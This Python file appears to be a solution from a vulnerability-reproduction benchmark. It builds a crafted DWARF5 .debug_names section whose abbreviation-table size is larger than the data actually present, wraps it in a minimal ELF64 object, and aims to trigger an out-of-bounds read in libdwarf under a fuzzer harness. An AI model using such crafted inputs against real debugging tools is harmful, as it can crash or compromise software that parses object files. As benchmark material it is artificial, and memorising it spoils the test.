import os
import io
import tarfile
import struct
from typing import List, Tuple, Optional


def _p8(x: int) -> bytes:
    return struct.pack("<B", x & 0xFF)


def _p16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def _align_up(off: int, align: int) -> int:
    if align <= 1:
        return off
    return (off + (align - 1)) & ~(align - 1)


def _build_debug_names_section(extra_overread: int = 4) -> bytes:
    # Construct a minimal DWARF5 .debug_names Name Index Table with a crafted abbrev_table_size
    # that exceeds the remaining bytes by `extra_overread`.
    version = 5
    padding = 0
    cu_count = 0
    local_tu_count = 0
    foreign_tu_count = 0
    bucket_count = 1
    name_count = 1
    augmentation_string_size = 0

    # Fixed header after unit_length is 32 bytes:
    # version(2), pad(2), then 7x u32 fields
    fixed_header_after_len = 32

    # Arrays:
    # buckets: bucket_count * 4
    # hashes: name_count * 4
    # name_offsets: name_count * 4
    # entry_offsets: name_count * 4
    arrays_size = 4 * bucket_count + 4 * name_count + 4 * name_count + 4 * name_count

    # Provide only 1 byte of actual abbrev table data, but claim it is larger by extra_overread.
    abbrev_actual = b"\x80"  # uleb128 continuation byte to force an extra read if unchecked
    abbrev_table_size = len(abbrev_actual) + int(extra_overread)

    unit_length = fixed_header_after_len + augmentation_string_size + arrays_size + len(abbrev_actual)

    hdr = bytearray()
    hdr += _p32(unit_length)
    hdr += _p16(version)
    hdr += _p16(padding)
    hdr += _p32(cu_count)
    hdr += _p32(local_tu_count)
    hdr += _p32(foreign_tu_count)
    hdr += _p32(bucket_count)
    hdr += _p32(name_count)
    hdr += _p32(abbrev_table_size)
    hdr += _p32(augmentation_string_size)

    # augmentation string: empty
    # CU/TU lists: none (counts zero)

    # buckets
    hdr += _p32(1)  # 1-based index of first name
    # hashes
    hdr += _p32(0)
    # name_offsets
    hdr += _p32(0)
    # entry_offsets
    hdr += _p32(0)

    # abbrev table (truncated)
    hdr += abbrev_actual

    return bytes(hdr)


def _build_elf64_rel_with_sections(sections: List[Tuple[str, bytes, int, int, int]]) -> bytes:
    """
    Build a minimal ELF64 little-endian ET_REL containing the given sections.
    sections: list of (name, data, sh_type, sh_flags, sh_addralign)
    """
    # Ensure .debug_names is last to maximize chance of file-end OOB triggering ASan
    # (caller should order accordingly).

    # Build shstrtab
    shstr = bytearray(b"\x00")
    name_off = {"": 0}
    for nm in [".shstrtab"] + [s[0] for s in sections]:
        if nm in name_off:
            continue
        name_off[nm] = len(shstr)
        shstr += nm.encode("ascii", "strict") + b"\x00"

    # Prepare section headers list: null, .shstrtab, then provided sections
    shdrs = []
    SH_NULL = 0
    SHT_STRTAB = 3

    # ELF header constants
    EI_MAG = b"\x7fELF"
    EI_CLASS_64 = 2
    EI_DATA_LE = 1
    EI_VERSION = 1
    EI_OSABI_SYSV = 0
    e_type = 1  # ET_REL
    e_machine = 0x3E  # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_flags = 0
    e_ehsize = 64
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = 64

    shnum = 2 + len(sections)
    shstrndx = 1

    e_shoff = 64  # right after ELF header

    # Layout: [Ehdr][Shdrs...][section data...]
    shdr_table_size = shnum * e_shentsize
    data_off = 64 + shdr_table_size

    # Section 0: null
    shdrs.append((0, SH_NULL, 0, 0, 0, 0, 0, 0, 0, 0))

    # Section 1: .shstrtab
    shstr_align = 1
    data_off = _align_up(data_off, shstr_align)
    shstr_offset = data_off
    shstr_size = len(shstr)
    data_off += shstr_size
    shdrs.append((name_off[".shstrtab"], SHT_STRTAB, 0, 0, shstr_offset, shstr_size, 0, 0, shstr_align, 0))

    # Remaining sections
    sec_offsets = []
    for (nm, data, sh_type, sh_flags, sh_align) in sections:
        sh_align = max(1, int(sh_align))
        data_off = _align_up(data_off, sh_align)
        off = data_off
        sz = len(data)
        data_off += sz
        sec_offsets.append((nm, off, sz, sh_type, sh_flags, sh_align))

    for (nm, off, sz, sh_type, sh_flags, sh_align) in sec_offsets:
        shdrs.append((name_off[nm], sh_type, sh_flags, 0, off, sz, 0, 0, sh_align, 0))

    # Build ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = EI_MAG
    e_ident[4] = EI_CLASS_64
    e_ident[5] = EI_DATA_LE
    e_ident[6] = EI_VERSION
    e_ident[7] = EI_OSABI_SYSV
    # rest already zeros

    ehdr = bytearray()
    ehdr += bytes(e_ident)
    ehdr += _p16(e_type)
    ehdr += _p16(e_machine)
    ehdr += _p32(e_version)
    ehdr += _p64(e_entry)
    ehdr += _p64(e_phoff)
    ehdr += _p64(e_shoff)
    ehdr += _p32(e_flags)
    ehdr += _p16(e_ehsize)
    ehdr += _p16(e_phentsize)
    ehdr += _p16(e_phnum)
    ehdr += _p16(e_shentsize)
    ehdr += _p16(shnum)
    ehdr += _p16(shstrndx)
    assert len(ehdr) == 64

    # Build section header table
    shdr_blob = bytearray()
    for (sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize) in shdrs:
        shdr_blob += struct.pack(
            "<IIQQQQIIQQ",
            sh_name,
            sh_type,
            sh_flags,
            sh_addr,
            sh_offset,
            sh_size,
            sh_link,
            sh_info,
            sh_addralign,
            sh_entsize,
        )
    assert len(shdr_blob) == shdr_table_size

    # Build file image
    out = bytearray()
    out += ehdr
    out += shdr_blob

    # Pad to shstrtab offset
    if len(out) < shstr_offset:
        out += b"\x00" * (shstr_offset - len(out))
    out += bytes(shstr)

    # Add sections data
    for (nm, off, sz, sh_type, sh_flags, sh_align) in sec_offsets:
        if len(out) < off:
            out += b"\x00" * (off - len(out))
        # Find original data by name
        data = None
        for (n2, d2, _, _, _) in sections:
            if n2 == nm:
                data = d2
                break
        if data is None:
            data = b"\x00" * sz
        out += data

    # Ensure last section ends exactly at EOF
    maxend = 0
    for (nm, off, sz, *_rest) in sec_offsets:
        if off + sz > maxend:
            maxend = off + sz
    if len(out) > maxend:
        out = out[:maxend]
    elif len(out) < maxend:
        out += b"\x00" * (maxend - len(out))

    return bytes(out)


def _iter_source_texts(src_path: str):
    def yield_text(name: str, b: bytes):
        try:
            yield name, b.decode("utf-8", "ignore")
        except Exception:
            yield name, ""

    if os.path.isdir(src_path):
        for root, _dirs, files in os.walk(src_path):
            for fn in files:
                if not (fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp"))):
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                    if st.st_size > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        b = f.read(200_000)
                    yield from yield_text(p, b)
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                n = m.name
                if not n.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    b = f.read(200_000)
                    yield from yield_text(n, b)
                except Exception:
                    continue
    except Exception:
        return


def _detect_input_mode(src_path: str) -> str:
    # Heuristic: if a fuzzer harness exists and initializes libdwarf from object/file APIs,
    # treat input as object file (ELF). Otherwise, attempt raw.
    saw_fuzzer = False
    saw_debugnames = False
    saw_object_init = False

    for name, txt in _iter_source_texts(src_path):
        if "LLVMFuzzerTestOneInput" in txt:
            saw_fuzzer = True
            if "debug_names" in txt or "debugnames" in txt or "dwarf_debugnames" in txt:
                saw_debugnames = True
            if ("dwarf_object_init" in txt) or ("dwarf_init_path" in txt) or ("dwarf_init_b" in txt) or ("dwarf_init(" in txt):
                saw_object_init = True

    if saw_fuzzer and saw_debugnames and not saw_object_init:
        return "RAW"
    return "ELF"


class Solution:
    def solve(self, src_path: str) -> bytes:
        debug_names = _build_debug_names_section(extra_overread=4)
        mode = _detect_input_mode(src_path)
        if mode == "RAW":
            return debug_names

        # Minimal ELF with only .debug_names and .shstrtab, with .debug_names at EOF.
        SHT_PROGBITS = 1
        elf = _build_elf64_rel_with_sections([
            (".debug_names", debug_names, SHT_PROGBITS, 0, 1),
        ])
        return elf